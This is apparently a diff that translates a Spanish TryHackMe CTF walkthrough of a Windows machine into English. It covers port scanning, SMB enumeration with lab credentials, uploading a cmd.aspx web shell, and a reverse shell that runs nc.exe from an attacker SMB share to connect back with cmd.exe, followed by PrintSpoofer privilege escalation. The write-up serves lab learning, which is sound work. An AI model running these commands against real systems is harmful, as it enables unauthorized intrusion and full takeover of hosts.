@@ -8,11 +8,11 @@ tags: [ctf, windows, Tryhackme, Walkthrough, SeImpersonatePrivilege]
 categories: Tryhackme
 ---
 
-{: .message}
+It is an interesting windows machine in the initial part and in the climbing that can present a challenge.
+---
 
-Es una maquina windows interesante en la parte inicial y en la escalada que puede presentar un reto.
-## Enumeracion
-*Puertos:*
+## Enumeration
+*Ports:*
 ```plaintext
 80/tcp   --> Microsoft IIS httpd 10.0
 135/tcp  --> Microsoft Windows RPC
@@ -21,7 +21,7 @@ Es una maquina windows interesante en la parte inicial y en la escalada que pued
 3389/tcp --> Microsoft Terminal Services
 ```
 ### Nmap
-*Para escanear todos los puertos rapido:*
+*To scan all ports quickly:*
 ```bash
 nmap -p- -sT --min-rate 5000  10.10.89.170 -oG Scanport1
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-13 20:26 EDT
@@ -40,7 +40,7 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds
 ```
 
-*Escaneo mas exhaustivo:*
+*More exhaustive scanning:*
 
 ```bash
 # Nmap 7.91 scan initiated Thu May 13 20:35:05 2021 as: nmap -sC -sV -p80,135,139,445,3389 -oN Scanport2 10.10.89.170
@@ -97,7 +97,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ### Masscan
 
-*Aqui hago uso de otra utilidad para confirmar lo que tengo y descartar falsos positivos:*
+*Here I make use of another utility to confirm what I have and rule out false positives:*
 
 ```bash
 masscan -e tun0 --rate=500 -p 0-65535 10.10.173.246
@@ -112,7 +112,7 @@ Discovered open port 49663/tcp on 10.10.173.246
 
 ### SMB enumeration
 
-Carpeta compatida de interes: *nt4wrksv*
+Compatible folder of interest: *nt4wrksv*
 
 ```json
 smbmap -H 10.10.89.170 -u benji -p benji                                                 3s
@@ -127,7 +127,7 @@ smbmap -H 10.10.89.170 -u benji -p benji                                        
 
 ### Credentials
 
-Estas fueron obtenidas de la carpeta compartida nt4wrksv
+These were obtained from the shared folder nt4wrksv
 
 ```plaintext
 Bob - !P@$$W0rD!123
@@ -136,14 +136,14 @@ Bill - Juw4nnaM4n420696969!$$$
 
 ## SMB upload cmd.aspx
 
-La idea es que si te metes por la web: http://ip:49663/nt4wrksv/passwords.txt puedes visualizar los archivos que se encuentra en el smb. Entonces teniendo esto claro la idea es subir una cmd.aspx. (Primero probe con la cmd.asp pero esta no me dio resultado y luego pase a la cmd.aspx)
+The idea is that if you go to the web: http://ip:49663/nt4wrksv/passwords.txt you can visualize the files that are in the smb. So having this clear the idea is to upload a cmd.aspx. (First I tried with the cmd.asp but it did not work and then I moved to the cmd.aspx).
 
-Vemos como se nos muestra una cmd:
+We see how a cmd is displayed:
 http://ip:49663/nt4wrksv/cmd.aspx 
 
 ## Shell inicial
 
-Corremos un servidor de smb y luego tiramos de un archivo compartido que es nc.exe y nos lazamos una reverse:
+We run an smb server and then pull a shared file which is nc.exe and launch a reverse:
 
 ```bash
 \\10.9.206.201\share\nc.exe 10.9.206.201 4444 -e cmd.exe
@@ -161,7 +161,7 @@ c:\windows\system32\inetsrv>
 
 ## PrivEsc
 
-El primer comando siempre debe ser ```whoami /priv``` para saber los permisos que posee ese usuario:
+The first command should always be ```whoami /priv``` to know the permissions that user has:
 
 ```bash
 whoami /priv
@@ -180,9 +180,9 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 
-Aqui resalta el famoso SeImpersonatePrivilege, para la explotacion de dicho privilegio se hace tirando de este [binario](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
+Here highlights the famous SeImpersonatePrivilege, for the exploitation of this privilege is done by pulling this [binary](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
 
-Ejecutamos el binario desde el directorio de bob:
+We execute the binary from bob's directory:
 
 ```bash
 \\10.9.206.201\share\PrintSpoofer64.exe -i -c cmd
@@ -200,3 +200,7 @@ C:\Windows\system32>
 ```
 
 MACHINE PWNED!!!!!
+
+<p align="center">
+<img src="https://tenor.com/view/typing-petty-fast-cloudy-with-a-chance-of-meatballs-flint-lockwood-gif-4907824.gif" width="200" height="200" />
+</p>
